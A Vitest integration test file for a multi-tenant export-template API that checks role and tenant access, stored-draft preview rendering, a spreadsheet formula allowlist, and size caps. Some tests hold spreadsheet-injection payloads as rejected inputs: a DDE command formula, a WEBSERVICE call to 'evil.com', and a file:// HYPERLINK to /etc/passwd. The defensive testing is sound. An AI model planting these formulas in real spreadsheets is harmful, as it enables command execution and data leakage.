import crypto from 'node:crypto';
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import type { FastifyInstance } from 'fastify';
import ExcelJS from 'exceljs';
import { buildServer } from '../src/server.js';
import { pool } from '../src/db/pool.js';
import { initializeMetadataCatalog } from '../src/db/catalog-init.js';
import { migrationService } from '../src/migrations/migration-service.js';
import { createTestSession, type TestSession } from './test-session-helper.js';
import { exportTemplateService } from '../src/records/export/export-template-service.js';
import { buildPersonalMonthlyBudgetBenchmark } from '@config-platform/schema';

describe('Phase 2A: Export Template Grid Designer & Preview API', () => {
  let server: FastifyInstance;
  const testTenantA = `t_grid_a_${crypto.randomBytes(4).toString('hex')}`;
  const testTenantB = `t_grid_b_${crypto.randomBytes(4).toString('hex')}`;

  let itemEntityIdA: string;
  let ownerSessionA: TestSession;
  let builderSessionA: TestSession;
  let viewerSessionA: TestSession;
  let ownerSessionB: TestSession;

  let validGridTemplateId: string;

  beforeAll(async () => {
    await initializeMetadataCatalog(pool);
    server = await buildServer();
    await server.ready();

    await migrationService.provisionTenant(testTenantA, 'Grid Tenant A');
    await migrationService.provisionTenant(testTenantB, 'Grid Tenant B');

    ownerSessionA = await createTestSession(testTenantA, 'owner', 'grid_owner_a');
    builderSessionA = await createTestSession(testTenantA, 'builder', 'grid_builder_a');
    viewerSessionA = await createTestSession(testTenantA, 'viewer', 'grid_viewer_a');
    ownerSessionB = await createTestSession(testTenantB, 'owner', 'grid_owner_b');

    const entRes = await migrationService.createEntity(testTenantA, {
      name: 'item',
      label: 'Item',
      fields: [{ name: 'name', label: 'Name', type: 'text', required: true }],
    });
    itemEntityIdA = entRes.entity.id;

    // Create a valid grid template in Tenant A
    const created = await exportTemplateService.createTemplate(testTenantA, {
      name: 'Monthly Budget Export',
      entityId: itemEntityIdA,
      draft: buildPersonalMonthlyBudgetBenchmark(itemEntityIdA),
    });
    validGridTemplateId = created.id;
  }, 60000);

  afterAll(async () => {
    if (server) await server.close();
  });

  // ─── 1. Auth & Role & Tenant Isolation ─────────────────────────────────────

  it('render-preview: rejects unauthenticated with 401', async () => {
    const res = await server.inject({
      method: 'POST',
      url: `/api/export-templates/${validGridTemplateId}/render-preview`,
    });
    expect(res.statusCode).toBe(401);
  });

  it('render-preview: rejects viewer role with 403 (builder role or higher required)', async () => {
    const res = await server.inject({
      method: 'POST',
      url: `/api/export-templates/${validGridTemplateId}/render-preview`,
      headers: viewerSessionA.headers,
    });
    expect(res.statusCode).toBe(403);
    const body = JSON.parse(res.payload);
    expect(body.message).toMatch(/Builder role or higher required/i);
  });

  it('render-preview: cross-tenant access returns 404', async () => {
    const res = await server.inject({
      method: 'POST',
      url: `/api/export-templates/${validGridTemplateId}/render-preview`,
      headers: ownerSessionB.headers,
    });
    expect(res.statusCode).toBe(404);
  });

  // ─── 2. Preview Renders STORED Draft Only ──────────────────────────────────

  it('render-preview: renders the STORED draft as XLSX and ignores any body-supplied template', async () => {
    // Body attempts to inject a malicious or alternative sheet
    const injectedBody = {
      draft: {
        kind: 'grid',
        sheets: [
          {
            id: 'injected',
            name: 'Injected Sheet',
            order: 0,
            cells: {
              '0:0': { value: 'Injected Content Should Not Appear' },
            },
          },
        ],
      },
    };

    const res = await server.inject({
      method: 'POST',
      url: `/api/export-templates/${validGridTemplateId}/render-preview`,
      headers: builderSessionA.headers,
      payload: injectedBody,
    });

    expect(res.statusCode).toBe(200);
    expect(res.headers['content-type']).toContain(
      'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
    );
    expect(res.headers['content-disposition']).toContain('attachment');
    expect(res.headers['content-disposition']).toContain('.xlsx');

    // Parse the returned buffer with ExcelJS and verify it is the STORED draft
    const rawBuffer = res.rawPayload;
    const wb = new ExcelJS.Workbook();
    await wb.xlsx.load(rawBuffer);

    // Verify sheet names and contents from stored draft (Personal Monthly Budget)
    expect(wb.worksheets.length).toBeGreaterThanOrEqual(1);
    const ws = wb.getWorksheet('Personal Budget');
    expect(ws).toBeDefined();

    // Verify Title cell A1
    const cellA1 = ws!.getCell('A1');
    expect(cellA1.value).toBe('Personal Monthly Budget');

    // Confirm that the body-supplied sheet was NOT rendered
    const injectedSheet = wb.getWorksheet('Injected Sheet');
    expect(injectedSheet).toBeUndefined();
  });

  // ─── 3. Formula Allowlist & Rejection on Save ──────────────────────────────

  it('rejects forbidden formula functions (e.g. VLOOKUP, INDEX, NOW) on save with 400', async () => {
    const res = await server.inject({
      method: 'POST',
      url: '/api/export-templates',
      headers: builderSessionA.headers,
      payload: {
        name: 'Bad Function Template',
        entityId: itemEntityIdA,
        draft: {
          kind: 'grid',
          sheets: [
            {
              id: 'sheet_1',
              name: 'Sheet 1',
              order: 0,
              cells: {
                '0:0': { value: 10 },
                '1:0': { formula: '=VLOOKUP(10, A1:B10, 2, FALSE)' },
              },
            },
          ],
        },
      },
    });

    expect(res.statusCode).toBe(400);
    const body = JSON.parse(res.payload);
    expect(body.message).toMatch(/unsupported function "VLOOKUP"/i);
  });

  it('rejects external workbook references on save with 400', async () => {
    const res = await server.inject({
      method: 'POST',
      url: '/api/export-templates',
      headers: builderSessionA.headers,
      payload: {
        name: 'External Ref Template',
        entityId: itemEntityIdA,
        draft: {
          kind: 'grid',
          sheets: [
            {
              id: 'sheet_1',
              name: 'Sheet 1',
              order: 0,
              cells: {
                '0:0': { formula: '=[external_book.xlsx]Sheet1!A1 + 10' },
              },
            },
          ],
        },
      },
    });

    expect(res.statusCode).toBe(400);
    const body = JSON.parse(res.payload);
    expect(body.message).toMatch(/External workbook references are not allowed/i);
  });

  it('rejects DDE injection strings on save with 400', async () => {
    const res = await server.inject({
      method: 'POST',
      url: '/api/export-templates',
      headers: builderSessionA.headers,
      payload: {
        name: 'DDE Template',
        entityId: itemEntityIdA,
        draft: {
          kind: 'grid',
          sheets: [
            {
              id: 'sheet_1',
              name: 'Sheet 1',
              order: 0,
              cells: {
                '0:0': { formula: '=cmd|"/c calc"!A0' },
              },
            },
          ],
        },
      },
    });

    expect(res.statusCode).toBe(400);
    const body = JSON.parse(res.payload);
    expect(body.message).toMatch(/DDE/i);
  });

  it('rejects WEBSERVICE and INDIRECT functions on save with 400', async () => {
    const res = await server.inject({
      method: 'POST',
      url: '/api/export-templates',
      headers: builderSessionA.headers,
      payload: {
        name: 'Restricted Functions Template',
        entityId: itemEntityIdA,
        draft: {
          kind: 'grid',
          sheets: [
            {
              id: 'sheet_1',
              name: 'Sheet 1',
              order: 0,
              cells: {
                '0:0': { formula: '=WEBSERVICE("http://evil.com/leak")' },
              },
            },
          ],
        },
      },
    });

    expect(res.statusCode).toBe(400);
    const body = JSON.parse(res.payload);
    expect(body.message).toMatch(/Restricted functions are not allowed/i);
  });

  it('rejects non-http(s) HYPERLINK on save with 400', async () => {
    const res = await server.inject({
      method: 'POST',
      url: '/api/export-templates',
      headers: builderSessionA.headers,
      payload: {
        name: 'File Protocol Hyperlink Template',
        entityId: itemEntityIdA,
        draft: {
          kind: 'grid',
          sheets: [
            {
              id: 'sheet_1',
              name: 'Sheet 1',
              order: 0,
              cells: {
                '0:0': { formula: '=HYPERLINK("file:///etc/passwd", "Click")' },
              },
            },
          ],
        },
      },
    });

    expect(res.statusCode).toBe(400);
    const body = JSON.parse(res.payload);
    expect(body.message).toMatch(/HYPERLINK function only allows http:\/\/, https:\/\//i);
  });

  it('accepts allowed functions (SUM, AVERAGE, COUNT, COUNTA, MIN, MAX, IF, ROUND, ABS, SUBTOTAL) and arithmetic', async () => {
    const res = await server.inject({
      method: 'POST',
      url: '/api/export-templates',
      headers: builderSessionA.headers,
      payload: {
        name: 'Allowed Formulas Template',
        entityId: itemEntityIdA,
        draft: {
          kind: 'grid',
          sheets: [
            {
              id: 'sheet_1',
              name: 'Sheet 1',
              order: 0,
              cells: {
                '0:0': { value: 10 },
                '1:0': { value: 20 },
                '2:0': { formula: '=SUM(A1:A2) + 5' },
                '3:0': { formula: '=AVERAGE(A1:A2)' },
                '4:0': { formula: '=IF(A1 > 5, ROUND(A2 / 2, 0), ABS(A1))' },
                '5:0': { formula: '=SUBTOTAL(9, A1:A2)' },
              },
            },
          ],
        },
      },
    });

    expect(res.statusCode).toBe(201);
  });

  // ─── 4. Caps Enforcement (>10 sheets, >200,000 cells, >2 MB) ──────────────

  it('enforces sheet cap: rejects >10 sheets on save with 400', async () => {
    const sheets = [];
    for (let i = 0; i < 11; i++) {
      sheets.push({
        id: `s_${i}`,
        name: `Sheet ${i + 1}`,
        order: i,
        cells: { '0:0': { value: i } },
      });
    }

    const res = await server.inject({
      method: 'POST',
      url: '/api/export-templates',
      headers: builderSessionA.headers,
      payload: {
        name: 'Too Many Sheets',
        entityId: itemEntityIdA,
        draft: {
          kind: 'grid',
          sheets,
        },
      },
    });

    expect(res.statusCode).toBe(400);
    const body = JSON.parse(res.payload);
    expect(body.message).toMatch(/maximum limit of 10 sheets/i);
  });

  it('enforces cell cap: rejects >200,000 cells on save with 400', async () => {
    // Construct a draft with 200,001 cell definitions
    const cells: Record<string, any> = {};
    for (let i = 0; i < 200_001; i++) {
      cells[`${Math.floor(i / 100)}:${i % 100}`] = { value: 1 };
    }

    const res = await server.inject({
      method: 'POST',
      url: '/api/export-templates',
      headers: builderSessionA.headers,
      payload: {
        name: 'Too Many Cells',
        entityId: itemEntityIdA,
        draft: {
          kind: 'grid',
          sheets: [
            {
              id: 's_big',
              name: 'Sheet Big',
              order: 0,
              cells,
            },
          ],
        },
      },
    });

    expect(res.statusCode).toBe(400);
    const body = JSON.parse(res.payload);
    expect(body.message).toMatch(/maximum limit of 200,000 cells/i);
  });

  it('enforces 2 MB JSON payload cap on save with 400', async () => {
    // Construct large payload under 200,000 cells but exceeding 2 MB string length
    const hugeString = 'A'.repeat(2 * 1024 * 1024 + 100);
    const res = await server.inject({
      method: 'POST',
      url: '/api/export-templates',
      headers: builderSessionA.headers,
      payload: {
        name: 'Huge Payload Template',
        entityId: itemEntityIdA,
        draft: {
          kind: 'grid',
          sheets: [
            {
              id: 's_huge',
              name: 'Sheet Huge',
              order: 0,
              cells: {
                '0:0': { value: hugeString },
              },
            },
          ],
        },
      },
    });

    expect(res.statusCode).toBe(400);
    const body = JSON.parse(res.payload);
    expect(body.message).toMatch(/exceeds maximum limit of 2 MB/i);
  });
});
